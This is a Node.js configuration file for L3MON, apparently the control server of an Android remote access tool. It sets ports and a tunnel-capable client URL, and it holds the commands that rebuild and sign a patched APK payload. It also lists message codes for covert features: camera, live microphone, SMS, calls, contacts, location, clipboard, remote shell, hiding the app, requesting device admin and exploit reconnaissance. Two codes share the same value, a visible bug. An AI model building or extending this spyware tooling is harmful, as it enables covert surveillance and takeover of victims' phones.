const path = require('path');

exports.debug = false;

exports.web_port = 22533;
exports.control_port = 22222;

// Full URL the APK should connect to (can be a tunnel URL like https://xxx.loca.lt)
// Falls back to http://localhost:control_port if not set
exports.clientUrl = process.env.L3MON_CLIENT_URL || 'http://localhost:' + exports.control_port;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')

exports.downloadsFolder = '/client_downloads'
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
exports.photosFolder = '/client_photos'
exports.photosFullPath = path.join(__dirname, '../assets/webpublic', exports.photosFolder)

// Ensure directories exist
const fs = require('fs');
if (!fs.existsSync(exports.downloadsFullPath)) fs.mkdirSync(exports.downloadsFullPath, { recursive: true });
if (!fs.existsSync(exports.photosFullPath)) fs.mkdirSync(exports.photosFullPath, { recursive: true });

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');

exports.javaBin = '/opt/java/jdk8u502-b07/bin/java';
exports.buildCommand = '"' + exports.javaBin + '" -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
exports.signCommand = '"' + exports.javaBin + '" -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"';

exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    notificationFetch: '0xNF',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP',
    shell: '0xSH',
    shellOutput: '0xSO',
    alpine: '0xAL',
    alpineOutput: '0xAO',
    hideApp: '0xHA',
    showApp: '0xSA',
    requestAdmin: '0xRA',
    adminStatus: '0xAS',
    exploitRecon: '0xER',
    exploitReconOutput: '0xEO',
    packages: '0xPK',
    packagesOutput: '0xPO',
    alpineTerm: '0xAS',
    alpineTermInput: '0xAI',
    alpineTermEnd: '0xAE',
    alpineTermOutput: '0xAT',
    payloadPing: '0xPING',
    payloadEcho: '0xPECHO'
}

// Mic live streaming state: { deviceID: { active: true, timer: intervalID } }
exports.micLiveTimers = {};

exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
}